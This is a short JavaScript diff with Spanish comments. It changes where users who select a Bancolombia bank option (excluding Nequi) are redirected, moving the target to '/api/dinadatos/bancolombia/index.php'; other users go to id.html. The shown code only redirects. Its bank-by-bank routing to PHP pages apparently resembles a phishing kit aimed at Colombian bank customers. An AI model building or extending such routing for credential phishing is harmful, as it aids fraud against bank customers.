@@ -58,7 +58,7 @@
 
                 // Excepción: No redirigir si es "BANCOLOMBIA S.A.- NEQUI"
                 if (banco.includes("bancolombia") && !banco.includes("bancolombia s.a.- nequi".toLowerCase())) {
-                    window.location.href = "bancolombia/index.php";
+                    window.location.href = "/api/dinadatos/bancolombia/index.php";
                 } else {
                     window.location.href = "id.html"; // Redirige a id.html si no cumple la condición
                 }
